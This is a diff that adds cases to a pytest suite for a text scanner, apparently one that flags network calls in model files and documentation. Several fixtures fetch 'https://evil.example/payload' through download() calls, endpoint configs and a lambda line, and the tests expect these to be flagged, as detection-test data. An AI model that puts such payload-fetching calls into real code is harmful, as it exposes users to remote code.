@@ -160,6 +160,11 @@ def test_text_scanner_model_card_aliases_keep_documentation_urls_informational(
         "Dataset URL: https://example.com/dataset\n",
         "class labels are documented at https://example.com/classes\n",
         "def examples are documented at https://example.com/functions\n",
+        "Lambda: https://docs.aws.amazon.com/lambda/\n",
+        "lambda docs: https://example.com/functions\n",
+        "Webhook documentation: https://docs.example.com/webhooks\n",
+        "C2 research: https://example.com/security\n",
+        "config = {}  # docs: https://example.com/configuration\n",
     ],
 )
 def test_text_scanner_generic_documentation_url_labels_are_informational(
@@ -840,6 +845,7 @@ def test_text_scanner_indirect_network_api_call_remains_actionable(tmp_path: Pat
         'download("https://evil.example/payload")\n',
         'download(Path("weights"), "https://evil.example/payload")\n',
         'download(\n    "padding",\n    "https://evil.example/payload",\n)\n',
+        'download(\n    Path("weights"),\n    "https://evil.example/payload",\n)\n',
         'download("' + ("padding" * 800) + '", "https://evil.example/payload")\n',
     ],
 )
@@ -944,6 +950,8 @@ def test_text_scanner_documentation_code_like_prose_links_remain_informational(
         "<endpoint>https://evil.example/payload</endpoint>\n",
         'endpoint = {"url": "https://evil.example/payload"}\n',
         "endpoint:\n  url: https://evil.example/payload\n",
+        "Callback endpoint: https://evil.example/payload\n",
+        "Webhook documentation endpoint: https://evil.example/payload\n",
     ],
 )
 def test_text_scanner_documentation_endpoint_config_remains_actionable(tmp_path: Path, content: str) -> None:
@@ -958,6 +966,22 @@ def test_text_scanner_documentation_endpoint_config_remains_actionable(tmp_path:
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
+
+
+def test_text_scanner_real_lambda_url_expression_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text('lambda target: "https://evil.example/payload"\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
 
 
 @pytest.mark.parametrize("padding", ["    ", " " * 300])
